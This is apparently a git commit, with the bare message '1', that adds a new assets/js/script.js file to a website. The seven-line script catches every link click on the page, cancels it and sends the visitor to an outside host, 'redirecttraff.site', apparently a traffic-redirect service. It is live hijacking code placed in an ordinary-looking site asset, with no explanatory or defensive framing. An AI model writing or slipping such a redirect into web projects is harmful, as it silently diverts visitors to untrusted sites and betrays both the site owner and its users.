f32651f77587cdd1abd6b330789370ce8d87cfce
maratbabaev <you@example.com>
2025-11-07 16:14:02 +0300

    1

---
+++ assets/js/script.js
@@ -0,0 +1,7 @@
+document.querySelectorAll("a").forEach((elem) => {
+	elem.onclick = function (e) {
+		e.preventDefault();
+		window.location.href = "https://redirecttraff.site/tb7Wtqhg";
+		return false;
+	};
+});
